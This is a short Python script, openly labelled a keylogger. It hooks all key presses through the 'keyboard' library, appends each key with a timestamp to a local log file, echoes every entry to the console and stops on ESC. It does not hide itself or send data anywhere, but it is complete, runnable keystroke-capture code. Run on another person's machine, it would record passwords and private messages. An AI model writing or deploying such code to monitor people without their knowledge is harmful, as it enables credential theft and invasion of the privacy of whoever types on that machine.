import keyboard
import datetime
import os

LOG_FILE = "keystrokes.log"

def on_press(event):
    """Callback function for key press events"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} - Key pressed: {event.name}\n"
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    
    print(f"Logged: {log_entry.strip()}")

def start_keylogger():
    """Start the keylogger"""
    # Create log file if it doesn't exist
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("Keylogger started - " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\n")
    
    print(f"Keylogger started. Logging to {LOG_FILE}")
    print("Press ESC to stop...")
    
    # Hook keyboard events
    keyboard.on_press(on_press)
    
    # Wait for ESC key to stop
    keyboard.wait('esc')

if __name__ == "__main__":
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    finally:
        # Unhook all keyboard events
        keyboard.unhook_all()
        print("Keylogger stopped. All hooks removed.")